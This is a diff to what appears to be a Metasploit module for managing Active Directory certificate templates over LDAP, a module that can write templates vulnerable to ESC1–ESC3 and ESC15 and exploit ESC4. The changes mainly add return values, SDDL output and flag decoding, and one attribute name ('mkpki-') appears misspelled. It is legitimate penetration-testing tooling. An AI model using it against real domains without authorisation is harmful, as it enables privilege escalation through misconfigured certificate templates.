@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
           The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be
           restored using the CREATE or UPDATE actions. The CREATE and UPDATE actions require a certificate template data
           file to be specified to define the attributes. Template data files are provided to create a template that is
-          vulnerable to ESC1, ESC2, and ESC3.
+          vulnerable to ESC1, ESC2, ESC3 and ESC15.
 
           This module is capable of exploiting ESC4.
         },
@@ -116,8 +116,9 @@ class MetasploitModule < Msf::Auxiliary
       end
       @ldap = ldap
 
-      send("action_#{action.name.downcase}")
+      result = send("action_#{action.name.downcase}")
       print_good('The operation completed successfully!')
+      result
     end
   rescue Errno::ECONNRESET
     fail_with(Failure::Disconnected, 'The connection was reset.')
@@ -147,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
       "#{datastore['CERT_TEMPLATE']} Certificate Template"
     )
     print_status("Certificate template data written to: #{stored}")
-    obj
+    [obj, stored]
   end
 
   def get_domain_sid
@@ -323,24 +324,59 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Creating: #{dn}")
     @ldap.add(dn: dn, attributes: attributes)
     validate_query_result!(@ldap.get_operation_result.table)
+    dn
   end
 
   def action_delete
-    obj = get_certificate_template
+    obj, = get_certificate_template
 
     @ldap.delete(dn: obj['dn'].first)
     validate_query_result!(@ldap.get_operation_result.table)
+    true
   end
 
   def action_read
-    obj = get_certificate_template
+    obj, stored = get_certificate_template
 
     print_status('Certificate Template:')
-    print_status("  distinguishedName: #{obj['distinguishedname'].first}")
-    print_status("  displayName:       #{obj['displayname'].first}") if obj['displayname'].present?
+    print_status("  distinguishedName:    #{obj['distinguishedname'].first}")
+    print_status("  displayName:          #{obj['displayname'].first}") if obj['displayname'].present?
     if obj['objectguid'].first.present?
       object_guid = Rex::Proto::MsDtyp::MsDtypGuid.read(obj['objectguid'].first)
-      print_status("  objectGUID:        #{object_guid}")
+      print_status("  objectGUID:           #{object_guid}")
+    end
+    if obj['ntsecuritydescriptor'].first.present?
+      begin
+        sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj['ntsecuritydescriptor'].first)
+        sddl_text = sd.to_sddl_text(domain_sid: get_domain_sid)
+      rescue StandardError => e
+        elog('failed to parse a binary security descriptor to SDDL', error: e)
+      else
+        print_status("  nTSecurityDescriptor: #{sddl_text}")
+      end
+    end
+
+    pki_flag = obj['flags']&.first
+    if pki_flag.present?
+      pki_flag = [obj['flags'].first.to_i].pack('l').unpack1('L')
+      print_status("  flags: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
+      %w[
+        CT_FLAG_AUTO_ENROLLMENT
+        CT_FLAG_MACHINE_TYPE
+        CT_FLAG_IS_CA
+        CT_FLAG_ADD_TEMPLATE_NAME
+        CT_FLAG_IS_CROSS_CA
+        CT_FLAG_IS_DEFAULT
+        CT_FLAG_IS_MODIFIED
+        CT_FLAG_DONOTPERSISTINDB
+        CT_FLAG_ADD_EMAIL
+        CT_FLAG_PUBLISH_TO_DS
+        CT_FLAG_EXPORTABLE_KEY
+      ].each do |flag_name|
+        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
+          print_status("     * #{flag_name}")
+        end
+      end
     end
 
     pki_flag = obj['mspki-certificate-name-flag']&.first
@@ -429,6 +465,11 @@ class MetasploitModule < Msf::Auxiliary
       print_status("  msPKI-RA-Signature: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
     end
 
+    pki_flag = obj['mkpki-template-schema-version']&.first
+    if pki_flag.present?
+      print_status("  msPKI-Template-Schema-Version: #{pki_flag}")
+    end
+
     if obj['mspki-certificate-policy'].present?
       if obj['mspki-certificate-policy'].length == 1
         if (oid_name = get_pki_oid_displayname(obj['mspki-certificate-policy'].first)).present?
@@ -472,10 +513,16 @@ class MetasploitModule < Msf::Auxiliary
     if obj['pkimaxissuingdepth'].present?
       print_status("  pKIMaxIssuingDepth: #{obj['pkimaxissuingdepth'].first.to_i}")
     end
+
+    if obj['showinadvancedviewonly'].present?
+      print_status("  showInAdvancedViewOnly: #{obj['showinadvancedviewonly'].first}")
+    end
+
+    { object: obj, file: stored }
   end
 
   def action_update
-    obj = get_certificate_template
+    obj, = get_certificate_template
     new_configuration = load_local_template
 
     operations = []
@@ -487,6 +534,8 @@ class MetasploitModule < Msf::Auxiliary
         unless value.tally == new_value.tally
           operations << [:replace, attribute, new_value]
         end
+      elsif attribute == 'ntsecuritydescriptor'
+        # the security descriptor can't be deleted so leave it alone unless specified
       else
         operations << [:delete, attribute, nil]
       end
@@ -501,10 +550,11 @@ class MetasploitModule < Msf::Auxiliary
 
     if operations.empty?
       print_good('There are no changes to be made.')
-      return
+      return true
     end
 
     @ldap.modify(dn: obj['dn'].first, operations: operations, controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)])
     validate_query_result!(@ldap.get_operation_result.table)
+    true
   end
 end
